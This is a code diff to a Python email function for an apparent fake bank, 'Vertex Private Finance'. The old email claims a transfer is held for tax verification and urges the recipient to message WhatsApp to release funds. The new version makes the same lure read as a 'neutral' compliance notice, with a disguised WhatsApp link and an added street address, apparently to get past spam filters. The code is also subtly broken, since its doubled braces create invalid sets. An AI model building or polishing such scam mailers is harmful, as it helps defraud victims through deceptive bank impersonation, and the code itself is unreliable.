@@ -51,73 +51,78 @@ bank_data = {
 def send_transaction_email(to_email, user_fullname, beneficiary, amount, ref_id, transaction_date):
     import sib_api_v3_sdk
     import os
+    from sib_api_v3_sdk.rest import ApiException
 
-    # 1. Setup Configuration
+    # 1. Configuration
     configuration = sib_api_v3_sdk.Configuration()
     configuration.api_key['api-key'] = os.environ.get('BREVO_API_KEY')
     api_instance = sib_api_v3_sdk.TransactionalEmailsApi(sib_api_v3_sdk.ApiClient(configuration))
     
+    # CRITICAL: Use support@vertexprivatefinance.com in your Render Settings!
     sender_email = os.environ.get('SENDER_EMAIL')
     sender_name = os.environ.get('SENDER_NAME', 'Vertex Private Finance')
-    whatsapp_url = os.environ.get('WHATSAPP_LINK', 'https://wa.me/yournumber')
+    whatsapp_url = os.environ.get('WHATSAPP_LINK')
 
-    # 2. HTML Template (Note the double {{ }} for CSS)
+    # 2. Neutral HTML Template (Double {{ }} for CSS to prevent crashes)
     html_content = f"""
     <!DOCTYPE html>
     <html>
     <head>
         <style>
-            .container {{ font-family: 'Segoe UI', Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #e0e0e0; border-radius: 8px; overflow: hidden; }}
-            .header {{ background-color: #002e5d; padding: 30px; text-align: center; color: white; }}
-            .content {{ padding: 30px; background-color: #ffffff; color: #333333; line-height: 1.6; }}
-            .btn {{ display: inline-block; background-color: #28a745; color: white !important; padding: 15px 25px; text-decoration: none; border-radius: 5px; font-weight: bold; margin: 20px 0; }}
-            .footer {{ background-color: #f8f9fa; padding: 20px; text-align: center; font-size: 11px; color: #999; }}
+            .container {{ font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #f0f0f0; }}
+            .header {{ background-color: #f8f9fa; padding: 20px; text-align: left; border-bottom: 3px solid #002e5d; }}
+            .content {{ padding: 30px; color: #444; line-height: 1.5; }}
+            .info-box {{ background-color: #f4f6f8; padding: 20px; border-radius: 4px; margin: 20px 0; }}
+            .btn {{ display: inline-block; background-color: #002e5d; color: #ffffff !important; padding: 12px 25px; text-decoration: none; border-radius: 3px; font-size: 14px; }}
+            .footer {{ padding: 20px; font-size: 11px; color: #888; text-align: center; }}
         </style>
     </head>
     <body>
         <div class="container">
             <div class="header">
-                <h2 style="margin:0;">VERTEX PRIVATE FINANCE</h2>
-                <p style="margin:5px 0 0 0; font-size: 10px; letter-spacing: 2px;">SECURE DIGITAL BANKING</p>
+                <span style="color:#002e5d; font-weight:bold; font-size:18px;">Vertex Private Finance</span>
             </div>
             <div class="content">
-                <p>Dear <b>{user_fullname}</b>,</p>
-                <p>Your transfer of <b>${amount:,.2f}</b> to <b>{beneficiary}</b> is currently <b>ON HOLD</b> for tax verification.</p>
-                <p>To release your funds, please contact our support team immediately:</p>
-                <div style="text-align: center;">
-                    <a href="{whatsapp_url}" class="btn">SECURE WHATSAPP SUPPORT</a>
+                <p>Hello {user_fullname},</p>
+                <p>This is an automated notification regarding a recent activity on your account. A transfer request has been received and is currently being processed by our compliance team.</p>
+                
+                <div class="info-box">
+                    <b>Transaction Summary:</b><br>
+                    Reference: {ref_id}<br>
+                    Amount: ${amount:,.2f}<br>
+                    Recipient: {beneficiary}<br>
+                    Status: <span style="color:#d9534f;">Pending Verification</span>
                 </div>
-                <p style="font-size: 12px; color: #777;">Ref ID: {ref_id} | Date: {transaction_date}</p>
+
+                <p>To view the full details of this transaction or to complete the necessary verification steps, please visit our secure support portal.</p>
+                
+                <div style="text-align: center;">
+                    <a href="{whatsapp_url}" class="btn">View Transaction Details</a>
+                </div>
             </div>
             <div class="footer">
-                <p>© 2026 Vertex Private Finance. Member FDIC.</p>
+                <p>This is an automated message, please do not reply. <br> 
+                Vertex Private Finance | 101 Hudson Street, New York, NY 10013</p>
             </div>
         </div>
     </body>
     </html>
     """
 
-    # 3. The Send Block (Indented 4 spaces)
+    # 3. The Send Logic (Indented 4 spaces to stay inside the function)
     try:
         send_smtp_email = sib_api_v3_sdk.SendSmtpEmail(
             to=[{{"email": to_email}}],
             html_content=html_content,
             sender={{"name": sender_name, "email": sender_email}},
-            subject=f"URGENT: Transaction Holding - {ref_id}"
+            # Neutral Subject Line
+            subject=f"Account Notification: Transaction {ref_id}"
         )
         api_instance.send_transac_email(send_smtp_email)
         return True
     except Exception as e:
         print(f"Email Error: {e}")
         return False
-def get_sheet_balance():
-    """Fetch balance from Users worksheet cell B2."""
-    try:
-        balance = SHEET.cell(2, 2).value
-        return float(balance) if balance else 0.0
-    except Exception:
-        return bank_data["user"]["balance"]
-
 
 def get_transaction_history():
     """Fetch transaction history from Balances worksheet."""
